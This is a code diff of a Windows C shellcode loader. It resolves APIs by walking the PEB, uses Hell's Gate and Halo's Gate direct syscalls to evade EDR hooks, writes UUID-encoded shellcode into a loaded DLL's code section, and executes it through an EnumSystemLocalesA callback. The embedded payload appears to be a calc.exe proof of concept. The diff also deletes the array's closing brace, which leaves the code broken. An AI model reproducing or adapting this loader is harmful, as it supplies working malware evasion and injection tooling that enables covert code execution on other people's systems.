@@ -11,7 +11,7 @@ VOID HellsGate(IN WORD wSystemCall);
 VOID HellDescent();
 DWORD halosGateDown(IN LPVOID ntdllApiAddr, IN WORD index);
 DWORD halosGateUp(IN LPVOID ntdllApiAddr, IN WORD index);
-DWORD findSyscallNumber(IN LPVOID ntdllApiAddr);
+WORD findSyscallNumber(IN LPVOID ntdllApiAddr);
 
 // ASM Function Declaration
 LPVOID getExportDirectory(LPVOID dllAddr);
@@ -43,9 +43,9 @@ typedef struct Dll {
 
 typedef struct apis {
     tNtWriteVirtualMemory NtWriteVirtualMemory;
-    DWORD NtWriteVirtualMemorySyscall;
+    WORD NtWriteVirtualMemorySyscall;
     tNtProtectVirtualMemory NtProtectVirtualMemory;
-    DWORD NtProtectVirtualMemorySyscall;
+    WORD NtProtectVirtualMemorySyscall;
     tSleep Sleep;
     tWaitForSingleObject WaitForSingleObject;
     tLoadLibraryA LoadLibraryA;
@@ -131,14 +131,14 @@ int main()
         "c48348d5-3c28-7c06-0a80-fbe07505bb47",
         "6a6f7213-5900-8941-daff-d563616c632e",
         "00657865-9090-9090-9090-909090909090"
-    };
-    
+
+
     // Get Base Address of ntdll.dll
-    WCHAR * ws_ntdll = L"ntdll.dll";
+    WCHAR* ws_ntdll = L"ntdll.dll";
     Dll ntdll;
     WCHAR* ws_k32 = L"KERNEL32.DLL";
     Dll k32;
-    
+
     // Modified method from Sektor7 Malware Dev Course - https://institute.sektor7.net/
     PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
     PPEB_LDR_DATA ldr = peb->Ldr;
@@ -154,23 +154,23 @@ int main()
         PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
 
         // Check if BaseDllName is ntdll and return DLL base address
-        if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)ws_ntdll) == 0){
+        if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)ws_ntdll) == 0) {
             ntdll.dllBase = (HMODULE)pEntry->DllBase;
         }
         // Check if BaseDllName is kernel32 and return DLL base address
-        if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)ws_k32) == 0){
+        if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)ws_k32) == 0) {
             k32.dllBase = (HMODULE)pEntry->DllBase;
             break;
         }
     }
-    
+
     // Get Export Directory and Export Tables for NTDLL.DLL
     ntdll.Export.Directory = getExportDirectory((LPVOID)ntdll.dllBase);
     ntdll.Export.AddressTable = getExportAddressTable((LPVOID)ntdll.dllBase, ntdll.Export.Directory);
     ntdll.Export.NameTable = getExportNameTable((LPVOID)ntdll.dllBase, ntdll.Export.Directory);
     ntdll.Export.OrdinalTable = getExportOrdinalTable((LPVOID)ntdll.dllBase, ntdll.Export.Directory);
     apis api;
-    
+
     // NTDLL.NtProtectVirtualMemory- Resolve the API address by crawling the table
     // bobby.cooke$ python3 string2Array.py s_NtProtectVirtualMemory NtProtectVirtualMemory
     CHAR s_NtProtectVirtualMemory[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
@@ -195,18 +195,18 @@ int main()
             }
         }
     }
-    
+
     // Get Export Directory and Export Tables for  Kernel32.dll
     k32.Export.Directory = getExportDirectory((LPVOID)k32.dllBase);
     k32.Export.AddressTable = getExportAddressTable((LPVOID)k32.dllBase, k32.Export.Directory);
     k32.Export.NameTable = getExportNameTable((LPVOID)k32.dllBase, k32.Export.Directory);
     k32.Export.OrdinalTable = getExportOrdinalTable((LPVOID)k32.dllBase, k32.Export.Directory);
-    
+
     // kernel32.LoadLibrary
     CHAR loadLibraryAStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
     LPVOID loadLibraryAStrLen = (LPVOID)12;
     api.LoadLibraryA = (tLoadLibraryA)getSymbolAddress(loadLibraryAStr, loadLibraryAStrLen, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
-    
+
     // kernel32.Sleep
     //char SleepStr[] = "Sleep";
     CHAR SleepStr[] = { 'S','l','e','e','p',0 };
@@ -222,7 +222,7 @@ int main()
     DWORD_PTR RXSection = (DWORD_PTR)hVictimLib;
     RXSection += 0x1000;
     // memLoop pointer will be used to write a UUID to the RX section, then increment itself 16 bytes (0x10) so we can write the next UUID 2 shellcode
-    DWORD_PTR memLoop   = RXSection;
+    DWORD_PTR memLoop = RXSection;
     DWORD oldprotect = 0;
     // sizeof() will return the value: sizeof(CHAR*) X Number of UUIDs in the array
     // on x64, a memory pointer to CHAR is 8 bytes
@@ -252,25 +252,25 @@ int main()
     // Since sizeof(CHAR*) is 8 bytes, and sizeof(uuids) = sizeof(CHAR*) X #uuidsInUuidArray, this will give us 144 bytes (8*18)
     // All we need to do is take take that 144 and multiply it by 2, to get our padded decoded shellcode size of 288 bytes
     unsigned __int64 scSize = (unsigned __int64)sizeof(uuids) * 2;
-    
+
     // NtProtectVirtualMemory allocates memory in chunks of 1024 (the size of a memory page), so even requesting 5 bytes or 288 bytes, we will get 1024 returned. request 1025 and get 2048, etc
     // VirtualProtect(memLoop, sizeof(uuids), PAGE_READWRITE, &oldprotect);
     // nt.NtProtectVirtualMemory(hProc, &aligedETW, (PSIZE_T)&memPage, PAGE_READWRITE, &oldprotect);
     HellsGate(api.NtProtectVirtualMemorySyscall);
     HellDescent(hProc, &RXSection, (PSIZE_T)&scSize, PAGE_READWRITE, &oldprotect);
-    
+
     // Loop through our list of UUIDs and use UuidFromStringA 
     // to convert and load into memory
     for (int count = 0; count < sizeof(uuids) / sizeof(uuids[0]); count++) {
         RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[count], (UUID*)memLoop);
         memLoop += 16;
     }
-    
+
     // Change the DLL .TEXT section back to RX since we are done writing our shellcode there
     // VirtualProtect(RXSection, sizeof(uuids), PAGE_EXECUTE_READ, &oldprotect);
     HellsGate(api.NtProtectVirtualMemorySyscall);
     HellDescent(hProc, &RXSection, (PSIZE_T)&scSize, PAGE_EXECUTE_READ, &oldprotect);
-    
+
     // Jump to the DLL .TEXT section and execute our shellcode
     EnumSystemLocalesA((LOCALE_ENUMPROCA)RXSection, 0) == 0;
 }
